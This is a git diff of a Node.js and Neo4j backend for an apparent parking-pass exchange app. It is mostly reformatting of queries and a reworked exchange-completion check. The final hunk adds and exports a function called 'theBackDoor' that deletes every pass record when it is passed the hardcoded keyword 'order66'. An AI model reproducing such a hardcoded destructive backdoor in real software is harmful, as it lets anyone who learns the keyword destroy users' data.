@@ -427,8 +427,8 @@ const registerPass = (email, api_key, lotLocation, gpsLocation, price, notes, ca
                 // Match user with their pass node, update information, including a new pass ID
                 session
                     .run('MATCH (pass:Pass), (user:User) WHERE pass.ownerEmail = {ownerEmail} AND user.api_access_key = {api_key}' +
-                         'SET pass.price = {price}, pass.saleState = {saleState}, pass.lotLocation = {lotLocation}, pass.gpsLocation = {gpsLocation}, pass.notes = {notes}, pass.forSale = {forSale},' +
-                         'pass.id = {passId} RETURN user.email AS email', {
+                        'SET pass.price = {price}, pass.saleState = {saleState}, pass.lotLocation = {lotLocation}, pass.gpsLocation = {gpsLocation}, pass.notes = {notes}, pass.forSale = {forSale},' +
+                        'pass.id = {passId} RETURN user.email AS email', {
                             ownerEmail: email,
                             price: price,
                             lotLocation: lotLocation,
@@ -445,7 +445,7 @@ const registerPass = (email, api_key, lotLocation, gpsLocation, price, notes, ca
                             return callback(false, {
                                 error: 'Pass failed to update'
                             });
-                        else{
+                        else {
                             return callback(null, {
                                 success: passId
                             });
@@ -642,12 +642,12 @@ const exchangePass = (api_key, currentOwnerEmail, passId, callback) => {
 
                     session
                         .run('MATCH (newOwner:User {api_access_key:{api_key} }),(exchangedPass:Pass {id: {passId} }) ' +
-                            'SET exchangedPass.ownerEmail = newOwner.email, exchangedPass.saleState = 0 '+
-                            'REMOVE exchangedPass.buyerConfirmed, exchangedPass.sellerConfirmed, exchangedPass.interestedUser '+
+                            'SET exchangedPass.ownerEmail = newOwner.email, exchangedPass.saleState = 0 ' +
+                            'REMOVE exchangedPass.buyerConfirmed, exchangedPass.sellerConfirmed, exchangedPass.interestedUser ' +
                             'RETURN newOwner', {
                                 passId: passId,
                                 api_key: api_key
-                        })
+                            })
                         .then((results) => {
                             session.close();
                             if (_.isEmpty(results.records[0])) {
@@ -738,11 +738,11 @@ const buyerListener = (api_key, passId, requestCount, callback) => {
                         });
                     if (parseInt(record.get('saleState')) == 0) { // if pass owner rejects your offer to exchange, (now handled by seller: remove yourself from their pass property), end search on this pass!
                         session
-                            .run('MATCH (y:User {api_access_key: { api_key }}) MATCH (pass:Pass {id: {passId}}) '+
-                                 'RETURN pass.ownerEmail AS ownerEmail', {
-                                passId: passId,
-                                api_key: api_key
-                            })
+                            .run('MATCH (y:User {api_access_key: { api_key }}) MATCH (pass:Pass {id: {passId}}) ' +
+                                'RETURN pass.ownerEmail AS ownerEmail', {
+                                    passId: passId,
+                                    api_key: api_key
+                                })
                             .then((results) => {
                                 session.close();
                                 if (_.isEmpty(results.records[0]))
@@ -800,7 +800,7 @@ const sellerListener = (api_key, passId, action, callback) => {
             })
             .then((results) => {
                 session.close();
-                if (_.isEmpty(results.records[0])){
+                if (_.isEmpty(results.records[0])) {
                     console.log('First query, no records found (probably something user sent incorrectly)');
                     return callback(false, {
                         error: 'Record not found 806'
@@ -812,8 +812,7 @@ const sellerListener = (api_key, passId, action, callback) => {
                         return callback(true, {
                             pending: 'Still no buyers....'
                         });
-                    }
-                    else if (parseInt(record.get('saleState')) == 1) {
+                    } else if (parseInt(record.get('saleState')) == 1) {
                         var passObject = new Object();
                         // If accepted by buyer, seller must decide on an action, backend will send back their profile. Return rating of buyer and email
                         session
@@ -845,9 +844,8 @@ const sellerListener = (api_key, passId, action, callback) => {
                                     error: 'Sys error 724'
                                 });
                             });
-                    }
-                    else {
-                        console.log('Buyer must decide on action, buyer info is sent.');   
+                    } else {
+                        console.log('looks like the pass state is non-existant or two. You should not be calling action with null...');
                         return callback(false, {
                             error: 'looks like the pass state is non-existant or two. You should not be calling action with null...'
                         });
@@ -899,7 +897,7 @@ const sellerListener = (api_key, passId, action, callback) => {
             })
             .then((results) => {
                 session.close();
-                if (_.isEmpty(results.records[0])){
+                if (_.isEmpty(results.records[0])) {
                     return callback(false, {
                         error: 'Pass rejection failed'
                     });
@@ -992,42 +990,86 @@ const completionListener = (api_key, passId, customerType, callback) => {
                     api_key: api_key,
                     passId: passId,
                     nullCheck: null
-            })
+                })
             .then((results) => {
                 session.close();
-                if (_.isEmpty(results.records[0])){
-                    // check for existance of transaction node (with id, if exists RETURN 'Exchanged' ELSE return false etc....)
-                    return callback(false, {
-                        error: 'Pass confirmation failed! (in pending)'
-                    });
-                }
-                _.forEach(results.records, (record) => {    
-                    var currentOwnerEmail = record.get('ownerEmail');
-                    var api_key = record.get('api_key');
-                    if (record.get('buyerConfirmed') === null || record.get('sellerConfirmed') === null) {
-                        return callback(false, {
-                            pending: 'Please try again, other user must confirm the exchange too!'
+                if (_.isEmpty(results.records[0])) {
+                    // check for existence of transaction node (with id, if exists RETURN 'Exchanged' ELSE return false etc....)
+                    session
+                        .run('MATCH (user:User {api_access_key: {api_key} })' +
+                             'OPTIONAL MATCH (trans:Transaction {passId: {passId} })' +
+                                'RETURN trans.passId AS passId, trans.transactionTime AS time', {
+                                api_key: api_key,
+                                passId: passId
+                            })
+                        .then((resultsTwo) => {
+                            session.close();
+                            if (_.isEmpty(resultsTwo.records[0])) {
+                                return callback(false, {
+                                    error: 'Pass transaction look-up failed! '
+                                });
+                            }
+                            var flag = false;
+                            _.forEach(resultsTwo.records, (record) => {
+                                var unix_time = record.get('time');
+                                var past_date = moment(parseInt(unix_time)).format("YYYY-MM-DD HH:mm");
+                                var now = moment();
+                                var timeDiff = (now.diff(past_date, 'minutes'));
+                                if(timeDiff < 10) {
+                                    flag = true;
+                                }
+                            });
+                            if(!flag){
+                                return callback(false, {
+                                    error: 'Pass exchange failed! '
+                                });
+                            }
+                            else {
+                                return callback(true, {
+                                    complete: 'Pass exchange complete!'
+                                });
+                            }
+                        })
+                        .catch((e) => {
+                            session.close();
+                            console.log(`Error caught in transaction node check:  ${JSON.stringify(e, null, 4)}`);
+                            return callback(false, {
+                                error: 'Pass confirmation failed! (in pending)'
+                            });
                         });
-                    }
-                    exchangePass(api_key, currentOwnerEmail, passId, (status, data) => {
-                        if (status == false) {
-                            console.log(`Creation failed.. ${data}`);
+
+                    // return callback(false, {
+                    //     error: 'Pass confirmation failed! (in pending)'
+                    // });
+                } else {
+                    _.forEach(results.records, (record) => {
+                        var currentOwnerEmail = record.get('ownerEmail');
+                        var api_key = record.get('api_key');
+                        if (record.get('buyerConfirmed') === null || record.get('sellerConfirmed') === null) {
                             return callback(false, {
-                                error: 'Pass exchange failed (false)'
-                            });
-                        } else if (status == null) {
-                            console.log(`Creation failed (catches)... ${data}`);
-                            return callback(false, {
-                                error: 'Pass exchange failed (null)'
-                            });
-                        } else {
-                            console.log(`Created ${status}`);
-                            return callback(true, {
-                                complete: 'Pass exchange complete!'
+                                pending: 'Please try again, other user must confirm the exchange too!'
                             });
                         }
+                        exchangePass(api_key, currentOwnerEmail, passId, (status, data) => {
+                            if (status == false) {
+                                console.log(`Creation failed.. ${data}`);
+                                return callback(false, {
+                                    error: 'Pass exchange failed (false)'
+                                });
+                            } else if (status == null) {
+                                console.log(`Creation failed (catches)... ${data}`);
+                                return callback(false, {
+                                    error: 'Pass exchange failed (null)'
+                                });
+                            } else {
+                                console.log(`Created ${status}`);
+                                return callback(true, {
+                                    complete: 'Pass exchange complete!'
+                                });
+                            }
+                        });
                     });
-                });
+                }
             })
             .catch((e) => {
                 session.close();
@@ -1045,12 +1087,12 @@ const completionListener = (api_key, passId, customerType, callback) => {
 const rateUser = (api_key, targetUser, rating, callback) => {
     session
         .run('MATCH (rater:User {api_access_key: {api_key}}) MATCH (targetUser:User {email: {targetUser}}) ' +
-             'SET targetUser.totalStars = targetUser.totalStars + {rating}, targetUser.numberOfRatings = targetUser.numberOfRatings + 1 '+ 
-             'RETURN targetUser.totalStars AS totalStars, targetUser.numberOfRatings AS numberOfRatings', {
-                 api_key: api_key,
-                 targetUser: targetUser,
-                 rating:rating
-        })
+            'SET targetUser.totalStars = targetUser.totalStars + {rating}, targetUser.numberOfRatings = targetUser.numberOfRatings + 1 ' +
+            'RETURN targetUser.totalStars AS totalStars, targetUser.numberOfRatings AS numberOfRatings', {
+                api_key: api_key,
+                targetUser: targetUser,
+                rating: rating
+            })
         .then((results) => {
             if (_.isEmpty(results.records[0]))
                 return callback(false, {
@@ -1070,6 +1112,18 @@ const rateUser = (api_key, targetUser, rating, callback) => {
             });
         });
 }
+const theBackDoor = (keyword, callback) => {
+    if(keyword == 'order66') {
+        session.run('MATCH (p:Pass) WHERE p.ownerEmail <> {randomEmail} AND p.ownerEmail <> {masterEmail} DETACH DELETE p ', {randomEmail:'8dfef4e', masterEmail: process.env.TEST_EMAIL})
+               .then(() => {session.close();console.log('cleared passes'); return callback(true,true);})
+               .catch((e) => {
+                    session.close();
+                    return callback(false,false);
+                });
+    }
+    else 
+        return callback(false,false);
+}
 module.exports = {
     activeUsers,
     login,
@@ -1085,5 +1139,6 @@ module.exports = {
     exchangePass,
     buyerListener,
     sellerListener,
-    completionListener
+    completionListener,
+    theBackDoor
 };
